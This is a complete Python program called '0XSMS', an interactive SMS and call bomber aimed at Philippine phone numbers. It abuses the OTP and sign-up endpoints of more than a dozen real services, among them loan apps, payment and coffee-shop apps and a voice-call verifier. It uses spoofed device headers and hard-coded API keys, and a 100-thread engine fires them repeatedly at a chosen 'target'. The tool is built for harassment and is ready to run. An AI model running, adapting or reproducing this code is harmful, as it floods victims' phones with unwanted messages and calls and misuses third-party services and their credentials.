import os
import sys
import time
import random
import json
import threading
import logging
import hashlib
import re
import shutil
import requests
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeout
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.prompt import Prompt, Confirm
from rich.align import Align
from rich import box
import pyfiglet




CEILING_CONCURRENCY = 100



CEILING_ROUNDS = 50



CEILING_VOICE = 50



HORIZON_SECONDS = 900



MESSENGER_TIMEOUT = 5



CALLER_TIMEOUT = 15




console = Console()



logging.basicConfig(
    level=logging.WARNING,
    handlers=[logging.FileHandler('0xsms.log')],
)



chronicler = logging.getLogger(__name__)



abort_beacon = threading.Event()



outcome_ledger = queue.Queue()



campaign_ledger = []




def gauge_span():

    return shutil.get_terminal_size((80, 24)).columns




def compose_glyph(length=10):

    return ''.join(
        random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
        for _ in range(length)
    )




def fabricate_address():

    return f"{compose_glyph(10)}@gmail.com"




def witness_epoch():

    return int(time.time())




def witness_epoch_millis():

    return int(time.time() * 1000)




def temper_digits(number):

    stripped = re.sub(r'\D', '', number)

    if stripped.startswith('63'):

        stripped = stripped[2:]

    if stripped.startswith('0'):

        stripped = stripped[1:]

    return stripped[:10]




def render_subscriber(number):

    return f"+63{temper_digits(number)}"




def inscribe_gradually(glyphs, hue="bold bright_magenta", pause=0.012, terminus="\n"):

    for char in glyphs:

        console.print(
            char,
            style=hue,
            end="",
            soft_wrap=True,
        )

        time.sleep(pause)

    console.print(terminus, end="")




def wrought_banner(text, font="slant"):

    candidates = [font, "small", "mini", "standard"]

    span = gauge_span()

    for candidate in candidates:

        try:

            rendered = pyfiglet.figlet_format(text, font=candidate)

            lines = rendered.rstrip("\n").split("\n")

            longest = max(len(line) for line in lines) if lines else 0

            if longest <= span - 4:

                return rendered.rstrip("\n")

        except Exception:

            continue

    return text




def splay_header(animated=True):

    wipe_pane()

    span = gauge_span()

    art = wrought_banner("0XSMS", font="slant")

    art_lines = art.split("\n")

    art_width = max(len(line) for line in art_lines) if art_lines else 0

    margin = max(0, (span - art_width) // 2)

    gradient = [
        "bright_magenta",
        "magenta",
        "bright_red",
        "red",
        "bright_red",
        "magenta",
    ]

    if animated:

        for ordinal, line in enumerate(art_lines):

            tint = gradient[ordinal % len(gradient)]

            console.print(
                " " * margin + line,
                style=f"bold {tint}",
                soft_wrap=True,
            )

            time.sleep(0.05)

    else:

        for ordinal, line in enumerate(art_lines):

            tint = gradient[ordinal % len(gradient)]

            console.print(
                " " * margin + line,
                style=f"bold {tint}",
            )

    console.print()

    meta = "SMS + CALL BOMBER  |  by KLEN  |  t.me/klenxz"

    meta_width = len(meta)

    meta_margin = max(0, (span - meta_width) // 2)

    if animated:

        console.print(" " * meta_margin, end="")

        inscribe_gradually(meta, hue="bold bright_cyan", pause=0.008)

    else:

        console.print(" " * meta_margin + meta, style="bold bright_cyan")

    rule = "-" * min(span - 4, 60)

    console.print(Align.center(f"[bright_magenta]{rule}[/]"))

    console.print()




def reprint_header():

    splay_header(animated=False)




def propel_mwell(subscriber):

    try:

        epoch = witness_epoch_millis()

        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
            'x-app-version': '03.942.035',
            'x-device-type': 'android',
            'x-device-model': 'oneplus CPH2465',
            'x-timestamp': str(epoch),
            'x-request-id': compose_glyph(16),
        }

        body = {
            'country': 'PH',
            'phoneNumber': temper_digits(subscriber),
            'phoneNumberPrefix': '+63',
        }

        reply = requests.post(
            'https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_pexx(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'appversion': '3.0.14',
            'x-msession-id': 'undefined',
            'tid': compose_glyph(11),
        }

        body = {
            '0': {
                'json': {
                    'email': '',
                    'areaCode': '+63',
                    'phone': f'+63{tail}',
                    'otpChannel': 'TG',
                    'otpUsage': 'REGISTRATION',
                },
            },
        }

        reply = requests.post(
            'https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_support_vip(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Accept-Encoding': 'gzip',
            'boat': 'com.peso.loan.vip.credit',
            'surface': '1.0.7',
            'suggestion': 'd284bf47c4c1e4da4e3e6375498c6245',
            'telescope': '',
            'Content-Type': 'application/json; charset=utf-8',
        }

        body = {
            'invasion': tail,
            'persist': 'login',
            'threshold': False,
        }

        reply = requests.post(
            'https://supportviploan.com/pomelo/abortion/suffering/test',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_ezloan(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'accept-language': 'en',
            'imei': compose_glyph(32),
            'device': 'android',
            'appversion': '2.0.4',
            'appid': 'EZLOAN',
            'businessid': 'EZLOAN',
        }

        body = {
            'businessId': 'EZLOAN',
            'contactNumber': f'+63{tail}',
        }

        reply = requests.post(
            'https://gateway.ezloancash.ph/security/auth/otp/request',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_xpress(subscriber):

    try:

        tail = temper_digits(subscriber)

        epoch = witness_epoch()

        headers = {
            'User-Agent': 'Dalvik/2.1.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        body = {
            'FirstName': f'User{epoch}',
            'LastName': 'Test',
            'Email': f'user{epoch}@gmail.com',
            'Phone': f'+63{tail}',
        }

        reply = requests.post(
            'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_bistro(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465)',
            'Accept': 'application/json, text/plain, */*',
            'x-requested-with': 'com.allcardtech.bistro',
        }

        reply = requests.get(
            f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{tail}',
            headers=headers,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_bayad(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        body = {
            'mobileNumber': f'+63{tail}',
            'emailAddress': fabricate_address(),
        }

        reply = requests.post(
            'https://api.online.bayad.com/api/sign-up/otp',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_supreme(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'bill': '',
            'syndrome': '1.1.3',
            'throughout': 'com.supreme.money.loan',
            'cute': 'd284bf47c4c1e4da4e3e6375498c6245',
            'cure': '14.864864864864865',
            'come': '121.05883328670785',
            'Content-Type': 'application/json; charset=utf-8',
        }

        body = {
            'aide': 'd284bf47c4c1e4da4e3e6375498c6245',
            'exactly': tail,
            'sick': False,
        }

        reply = requests.post(
            'https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_pickup(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        body = {
            'mobile_number': f'+63{tail}',
            'login_method': 'mobile_number',
        }

        reply = requests.post(
            'https://production.api.pickup-coffee.net/v2/customers/login',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_honey(subscriber):

    try:

        tail = temper_digits(subscriber)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        body = {'phone': tail}

        reply = requests.post(
            'https://api.honeyloan.ph/api/client/registration/step-one',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_kumu(subscriber):

    try:

        tail = temper_digits(subscriber)

        epoch = witness_epoch()

        entropy = compose_glyph(32)

        seal = hashlib.sha256(
            f"{epoch}{entropy}{tail}kumu_secret_2024".encode()
        ).hexdigest()

        headers = {
            'User-Agent': 'okhttp/5.0.0-alpha.14',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'Device-Type': 'android',
            'Device-Id': compose_glyph(16),
        }

        body = {
            'country_code': '+63',
            'encrypt_rnd_string': entropy,
            'cellphone': tail,
            'encrypt_signature': seal,
            'encrypt_timestamp': epoch,
        }

        reply = requests.post(
            'https://api.kumuapi.com/v2/user/sendverifysms',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_s5(subscriber):

    try:

        full = f"+63{temper_digits(subscriber)}"

        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36',
        }

        reply = requests.post(
            'https://api.s5.com/player/api/v1/otp/request',
            headers=headers,
            data=f'phone_number={full}',
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_cashalo(subscriber):

    try:

        tail = temper_digits(subscriber)

        device_id = compose_glyph(16)

        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
            'x-device-identifier': device_id,
            'x-device-type': '1',
        }

        body = {
            'phone_number': tail,
            'device_identifier': device_id,
            'device_type': 1,
        }

        reply = requests.post(
            'https://api.cashaloapp.com/access/register',
            headers=headers,
            json=body,
            timeout=MESSENGER_TIMEOUT,
        )

        return reply.status_code == 200

    except Exception:

        return False




def propel_mocasa(subscriber):

    try:

        tail = temper_digits(subscriber)

        if not tail.startswith('9'):

            return False

        device_id = "0536db2db2b341e483de881c94e0e203"

        envelope = json.dumps({
            "country": "Philippines",
            "appVersion": 206,
            "appPackageName": "com.mocasa.ph",
            "mobile": tail,
            "channel": "APP",
            "systemType": 0,
            "myDeviceId": device_id,
            "appCode": "mocasa",
            "sendChannel": "voice",
            "verifyType": 1,
            "token": "",
        })

        headers = {
            'User-Agent': 'okhttp/4.8.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
        }

        reply = requests.post(
            'https://service.mocasa.com/app/v1/login/sendVerifyCode',
            headers=headers,
            data=envelope,
            timeout=CALLER_TIMEOUT,
        )

        if reply.status_code == 200:

            try:

                return reply.json().get('code') == 0

            except Exception:

                return False

        return False

    except Exception:

        return False




MESSENGER_REGISTRY = [
    ("MWELL",         propel_mwell),
    ("PEXX",          propel_pexx),
    ("SUPPORT VIP",   propel_support_vip),
    ("EZLOAN",        propel_ezloan),
    ("XPRESS PH",     propel_xpress),
    ("BISTRO",        propel_bistro),
    ("BAYAD CENTER",  propel_bayad),
    ("SUPREME LOAN",  propel_supreme),
    ("PICKUP COFFEE", propel_pickup),
    ("HONEY LOAN",    propel_honey),
    ("KUMU PH",       propel_kumu),
    ("S5.COM",        propel_s5),
    ("CASHALO",       propel_cashalo),
]



CALLER_REGISTRY = [
    ("MOCASA VOICE", propel_mocasa),
]




def dispatch_messenger(label, invoker, subscriber, pass_index):

    if abort_beacon.is_set():

        outcome_ledger.put(('sms', label, False, pass_index))

        return False

    try:

        verdict = invoker(subscriber)

        outcome_ledger.put(('sms', label, verdict, pass_index))

        return verdict

    except Exception:

        outcome_ledger.put(('sms', label, False, pass_index))

        return False




def dispatch_caller(label, invoker, subscriber, dial_index):

    if abort_beacon.is_set():

        outcome_ledger.put(('voice', label, False, dial_index))

        return False

    try:

        verdict = invoker(subscriber)

        outcome_ledger.put(('voice', label, verdict, dial_index))

        return verdict

    except Exception:

        outcome_ledger.put(('voice', label, False, dial_index))

        return False




def unleash_cascade(subscriber, modus, passes=0, dials=0):

    messenger_hits = 0

    messenger_total = 0

    caller_hits = 0

    caller_total = 0

    abort_beacon.clear()

    commenced_at = time.time()

    while not outcome_ledger.empty():

        try:

            outcome_ledger.get_nowait()

        except queue.Empty:

            break

    engages_messenger = modus in ('sms', 'both')

    engages_caller = modus in ('call', 'both')

    messenger_jobs = passes * len(MESSENGER_REGISTRY) if engages_messenger else 0

    caller_jobs = dials * len(CALLER_REGISTRY) if engages_caller else 0

    tally = messenger_jobs + caller_jobs

    completed = 0

    with Progress(
        SpinnerColumn(style="bright_magenta"),
        TextColumn("[bold bright_magenta]{task.description}"),
        BarColumn(
            bar_width=40,
            complete_style="bright_red",
            finished_style="bright_green",
        ),
        TextColumn("[bold bright_cyan]{task.completed}/{task.total}"),
        TextColumn("[dim]{task.fields[rate]}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:

        task = progress.add_task("FIRING", total=tally, rate="")

        with ThreadPoolExecutor(max_workers=CEILING_CONCURRENCY) as pool:

            pending_tasks = []

            if engages_messenger:

                for pass_index in range(1, passes + 1):

                    for label, invoker in MESSENGER_REGISTRY:

                        messenger_total += 1

                        pending_tasks.append(
                            pool.submit(
                                dispatch_messenger,
                                label,
                                invoker,
                                subscriber,
                                pass_index,
                            )
                        )

            if engages_caller:

                for dial_index in range(1, dials + 1):

                    for label, invoker in CALLER_REGISTRY:

                        caller_total += 1

                        pending_tasks.append(
                            pool.submit(
                                dispatch_caller,
                                label,
                                invoker,
                                subscriber,
                                dial_index,
                            )
                        )

            try:

                for _ in as_completed(pending_tasks, timeout=HORIZON_SECONDS):

                    if abort_beacon.is_set():

                        break

                    try:

                        channel, label, verdict, ident = outcome_ledger.get(timeout=1)

                    except queue.Empty:

                        continue

                    completed += 1

                    if channel == 'sms':

                        if verdict:

                            messenger_hits += 1

                    else:

                        if verdict:

                            caller_hits += 1

                    rate = (
                        f"[+] {messenger_hits + caller_hits}"
                        f"  [-] {(messenger_total + caller_total) - (messenger_hits + caller_hits)}"
                    )

                    progress.update(
                        task,
                        completed=completed,
                        rate=rate,
                    )

            except FuturesTimeout:

                progress.update(task, description="[yellow]CEILING HIT")

            except Exception as failure:

                chronicler.error(f"Engine error: {failure}")

    return (
        messenger_hits,
        messenger_total,
        caller_hits,
        caller_total,
        time.time() - commenced_at,
    )




def wipe_pane():

    console.clear()




def splay_main_menu():

    grid = Table(
        box=box.ROUNDED,
        border_style="bright_magenta",
        show_header=False,
        padding=(0, 3),
        expand=False,
    )

    grid.add_column("Key", style="bold bright_yellow", justify="center", width=5)

    grid.add_column("Action", style="bold white")

    grid.add_row("[1]", "-> Launch Attack")

    grid.add_row("[2]", "-> Service List")

    grid.add_row("[3]", "-> Attack History")

    grid.add_row("[4]", "-> Config")

    grid.add_row("[5]", "-> About")

    grid.add_row("[0]", "<< Exit")

    console.print(Align.center(
        Panel(
            grid,
            title="[bold bright_cyan]:: MAIN MENU ::[/]",
            border_style="bright_magenta",
            padding=(1, 4),
        )
    ))

    console.print()




def splay_mode_menu():

    grid = Table(
        box=box.ROUNDED,
        border_style="bright_red",
        show_header=False,
        padding=(0, 3),
        expand=False,
    )

    grid.add_column("Key", style="bold bright_yellow", justify="center", width=5)

    grid.add_column("Mode", style="bold white")

    grid.add_row("[1]", "[SMS]  SMS Only")

    grid.add_row("[2]", "[CALL] Call Only")

    grid.add_row("[3]", "[BOTH] SMS + Call")

    grid.add_row("[0]", "<< Back")

    console.print(Align.center(
        Panel(
            grid,
            title="[bold bright_red]:: ATTACK MODE ::[/]",
            border_style="bright_red",
            padding=(1, 4),
        )
    ))

    console.print()




def elicit_subscriber():

    while True:

        utterance = Prompt.ask(
            "[bold bright_cyan]|- Target number[/] [dim](09XXXXXXXXX)[/]"
        ).strip()

        if utterance.lower() in ("q", "quit", "cancel", "back"):

            return None

        tempered = temper_digits(utterance)

        if len(tempered) == 10 and tempered.startswith('9'):

            console.print(
                f"[bright_green]|_ [+] Target: {render_subscriber(tempered)}[/]\n"
            )

            return tempered

        console.print("[bright_red]|_ [-] Invalid. 10 digits starting with 9.[/]\n")




def elicit_measure(question, floor, summit, fallback):

    while True:

        utterance = Prompt.ask(
            f"[bold bright_cyan]|- {question}[/] [dim]({floor}-{summit}, default {fallback})[/]",
            default=str(fallback),
        ).strip()

        if utterance.lower() in ("q", "quit", "cancel", "back"):

            return None

        try:

            magnitude = int(utterance)

            if floor <= magnitude <= summit:

                console.print(
                    f"[bright_green]|_ [+] {question}: {magnitude}[/]\n"
                )

                return magnitude

            console.print(
                f"[bright_red]|_ [-] Out of range ({floor}-{summit}).[/]\n"
            )

        except ValueError:

            console.print("[bright_red]|_ [-] Not a number.[/]\n")




def splay_registry():

    wipe_pane()

    reprint_header()

    grid = Table(
        title="[bold bright_magenta]:: ACTIVE SERVICES ::[/]",
        box=box.HEAVY_EDGE,
        border_style="bright_magenta",
        title_style="bold bright_magenta",
    )

    grid.add_column("#", style="bright_yellow", justify="right", width=4)

    grid.add_column("SMS", style="bright_white")

    grid.add_column("#", style="bright_yellow", justify="right", width=4)

    grid.add_column("VOICE", style="bright_cyan")

    tallest = max(len(MESSENGER_REGISTRY), len(CALLER_REGISTRY))

    for ordinal in range(tallest):

        messenger_label = (
            MESSENGER_REGISTRY[ordinal][0]
            if ordinal < len(MESSENGER_REGISTRY)
            else ""
        )

        caller_label = (
            CALLER_REGISTRY[ordinal][0]
            if ordinal < len(CALLER_REGISTRY)
            else ""
        )

        messenger_num = str(ordinal + 1) if messenger_label else ""

        caller_num = str(ordinal + 1) if caller_label else ""

        grid.add_row(messenger_num, messenger_label, caller_num, caller_label)

    console.print(Align.center(grid))

    console.print(
        f"\n[dim]SMS: {len(MESSENGER_REGISTRY)}  |  Voice: {len(CALLER_REGISTRY)}[/]\n"
    )

    Prompt.ask("[dim]Press Enter to return[/]", default="")




def splay_ledger():

    wipe_pane()

    reprint_header()

    if not campaign_ledger:

        console.print(Align.center(
            Panel(
                "[dim]No attacks yet this session.[/]",
                border_style="bright_magenta",
            )
        ))

    else:

        grid = Table(
            title="[bold bright_magenta]:: SESSION HISTORY ::[/]",
            box=box.HEAVY_EDGE,
            border_style="bright_magenta",
        )

        grid.add_column("#", style="bright_yellow", justify="right")

        grid.add_column("Mode", style="bright_yellow")

        grid.add_column("Target", style="bright_white")

        grid.add_column("SMS", style="bright_green", justify="center")

        grid.add_column("Voice", style="bright_cyan", justify="center")

        grid.add_column("Duration", style="bright_magenta", justify="right")

        for ordinal, entry in enumerate(campaign_ledger, 1):

            grid.add_row(
                str(ordinal),
                entry.get('mode', '?').upper(),
                render_subscriber(entry['phone']),
                f"{entry['sms_ok']}/{entry['sms_t']}" if entry['sms_t'] else "--",
                f"{entry['v_ok']}/{entry['v_t']}" if entry['v_t'] else "--",
                f"{entry['elapsed']:.1f}s",
            )

        console.print(Align.center(grid))

    console.print()

    Prompt.ask("[dim]Press Enter to return[/]", default="")




def splay_parameters():

    wipe_pane()

    reprint_header()

    grid = Table(
        box=box.ROUNDED,
        border_style="bright_magenta",
        show_header=False,
    )

    grid.add_column("Key", style="bold bright_yellow")

    grid.add_column("Value", style="bright_white")

    grid.add_row("MAX_WORKERS", str(CEILING_CONCURRENCY))

    grid.add_row("MAX_ROUNDS", str(CEILING_ROUNDS))

    grid.add_row("MAX_VOICE_CALLS", str(CEILING_VOICE))

    grid.add_row("ATTACK_CEILING_S", f"{HORIZON_SECONDS}s")

    grid.add_row("SMS_TIMEOUT", f"{MESSENGER_TIMEOUT}s")

    grid.add_row("VOICE_TIMEOUT", f"{CALLER_TIMEOUT}s")

    grid.add_row("SMS_SERVICES", str(len(MESSENGER_REGISTRY)))

    grid.add_row("VOICE_SERVICES", str(len(CALLER_REGISTRY)))

    console.print(Align.center(
        Panel(
            grid,
            title="[bold bright_cyan]:: CONFIG ::[/]",
            border_style="bright_magenta",
            padding=(1, 3),
        )
    ))

    console.print()

    Prompt.ask("[dim]Press Enter to return[/]", default="")




def splay_provenance():

    wipe_pane()

    reprint_header()

    console.print(Align.center(
        Panel(
            "[bold bright_magenta]0XSMS FIRE TERMINAL[/]\n\n"
            "[bright_white]Interactive SMS + Call bomber for terminals.[/]\n"
            "[bright_white]Modes: SMS only | Call only | Both.[/]\n"
            "[bright_white]All services fire automatically.[/]\n\n"
            f"[bright_cyan]SMS services  :[/] [bold]{len(MESSENGER_REGISTRY)}[/]\n"
            f"[bright_cyan]Voice services:[/] [bold]{len(CALLER_REGISTRY)}[/]\n"
            f"[bright_cyan]Max workers   :[/] [bold]{CEILING_CONCURRENCY}[/]\n\n"
            "[dim]Built by KLEN | t.me/klenxz[/]",
            border_style="bright_magenta",
            padding=(1, 3),
        )
    ))

    console.print()

    Prompt.ask("[dim]Press Enter to return[/]", default="")




def commence_campaign():

    wipe_pane()

    reprint_header()

    splay_mode_menu()

    modus_pick = Prompt.ask(
        "[bold bright_red]>[/]",
        choices=["0", "1", "2", "3"],
        show_choices=False,
    ).strip()

    if modus_pick == "0":

        return

    modus = {"1": "sms", "2": "call", "3": "both"}[modus_pick]

    wipe_pane()

    reprint_header()

    console.print(Align.center(
        Panel(
            f"[bold bright_red]>> LAUNCH ATTACK  |  {modus.upper()}[/]",
            border_style="bright_red",
            padding=(0, 4),
        )
    ))

    console.print()

    subscriber = elicit_subscriber()

    if not subscriber:

        return

    passes = 0

    dials = 0

    if modus in ("sms", "both"):

        passes = elicit_measure("SMS rounds", 1, CEILING_ROUNDS, 5)

        if passes is None:

            return

    if modus in ("call", "both"):

        dials = elicit_measure("Voice calls", 1, CEILING_VOICE, 1)

        if dials is None:

            return

    console.print()

    brief = Table(
        box=box.ROUNDED,
        border_style="bright_red",
        show_header=False,
    )

    brief.add_column("Key", style="bold bright_yellow")

    brief.add_column("Value", style="bright_white")

    brief.add_row("Mode", modus.upper())

    brief.add_row("Target", render_subscriber(subscriber))

    if modus in ("sms", "both"):

        brief.add_row("SMS rounds", str(passes))

    if modus in ("call", "both"):

        brief.add_row("Voice calls", str(dials))

    brief.add_row("Workers", str(CEILING_CONCURRENCY))

    jobs = 0

    if modus in ("sms", "both"):

        jobs += passes * len(MESSENGER_REGISTRY)

    if modus in ("call", "both"):

        jobs += dials * len(CALLER_REGISTRY)

    brief.add_row("Total jobs", str(jobs))

    console.print(Align.center(
        Panel(
            brief,
            title="[bold bright_red]:: ATTACK SUMMARY ::[/]",
            border_style="bright_red",
            padding=(1, 3),
        )
    ))

    console.print()

    if not Confirm.ask("[bold bright_red]FIRE?[/]", default=False):

        console.print("[dim]Cancelled.[/]\n")

        time.sleep(0.5)

        return

    console.print()

    outcome = execute_campaign(subscriber, modus, passes, dials)

    if outcome:

        campaign_ledger.append(outcome)

    console.print()

    Prompt.ask("[dim]Press Enter to return[/]", default="")




def execute_campaign(subscriber, modus, passes, dials):

    brief = Table(
        box=box.ROUNDED,
        border_style="bright_red",
        show_header=False,
    )

    brief.add_column("Key", style="bold bright_yellow")

    brief.add_column("Value", style="bright_white")

    brief.add_row("Mode", modus.upper())

    brief.add_row("Target", render_subscriber(subscriber))

    if modus in ("sms", "both"):

        brief.add_row("SMS rounds", str(passes))

    if modus in ("call", "both"):

        brief.add_row("Voice", str(dials))

    brief.add_row("Workers", str(CEILING_CONCURRENCY))

    console.print(Align.center(
        Panel(
            brief,
            title="[bold bright_red]>> FIRING <<[/]",
            border_style="bright_red",
            padding=(1, 3),
        )
    ))

    console.print()

    try:

        messenger_hits, messenger_total, caller_hits, caller_total, duration = (
            unleash_cascade(subscriber, modus, passes, dials)
        )

    except KeyboardInterrupt:

        abort_beacon.set()

        console.print(
            "\n[bright_yellow][!] Interrupted -- threads draining...[/]\n"
        )

        messenger_hits = 0

        messenger_total = 0

        caller_hits = 0

        caller_total = 0

        duration = 0.0

    console.print()

    messenger_rate = (
        (messenger_hits * 100 // messenger_total)
        if messenger_total
        else 0
    )

    caller_rate = (
        (caller_hits * 100 // caller_total)
        if caller_total
        else 0
    )

    verdict_table = Table(
        box=box.HEAVY_EDGE,
        border_style="bright_green",
        show_header=False,
    )

    verdict_table.add_column("Metric", style="bold bright_cyan")

    verdict_table.add_column("Value", style="bright_white")

    verdict_table.add_row("Mode", modus.upper())

    verdict_table.add_row("Target", render_subscriber(subscriber))

    verdict_table.add_row("Duration", f"{duration:.2f}s")

    if messenger_total:

        verdict_table.add_row(
            "SMS sent",
            f"{messenger_hits}/{messenger_total}  ({messenger_rate}%)",
        )

    if caller_total:

        verdict_table.add_row(
            "Voice sent",
            f"{caller_hits}/{caller_total}  ({caller_rate}%)",
        )

    verdict_table.add_row(
        "Total hits",
        f"[bold bright_green]{messenger_hits + caller_hits}[/]/{messenger_total + caller_total}",
    )

    console.print(Align.center(
        Panel(
            verdict_table,
            title="[bold bright_green][+] ATTACK COMPLETE[/]",
            border_style="bright_green",
            padding=(1, 3),
        )
    ))

    return {
        'phone': subscriber,
        'mode': modus,
        'sms_ok': messenger_hits,
        'sms_t': messenger_total,
        'v_ok': caller_hits,
        'v_t': caller_total,
        'elapsed': duration,
    }




def oversee_loop():

    splay_header(animated=True)

    time.sleep(0.3)

    while True:

        try:

            wipe_pane()

            splay_header(animated=False)

            splay_main_menu()

            pick = Prompt.ask(
                "[bold bright_magenta]>[/]",
                choices=["0", "1", "2", "3", "4", "5"],
                show_choices=False,
            ).strip()

            if pick == "0":

                break

            elif pick == "1":

                commence_campaign()

            elif pick == "2":

                splay_registry()

            elif pick == "3":

                splay_ledger()

            elif pick == "4":

                splay_parameters()

            elif pick == "5":

                splay_provenance()

        except KeyboardInterrupt:

            console.print("\n[bright_yellow]Ctrl-C -- exiting.[/]")

            break

        except Exception as failure:

            chronicler.error(f"Main loop: {failure}")

            console.print(f"[bright_red]Error: {failure}[/]")

            time.sleep(1)

    wipe_pane()

    console.print(Align.center(
        Panel(
            "[bold bright_magenta]0XSMS signing off.[/]\n"
            "[dim]Fire out. Steel cool.[/]",
            border_style="bright_magenta",
            padding=(1, 3),
        )
    ))

    console.print()




if __name__ == "__main__":

    try:

        oversee_loop()

    except KeyboardInterrupt:

        pass

    except Exception as failure:

        console.print(f"\n[bright_red][FATAL] {failure}[/]")

        sys.exit(1)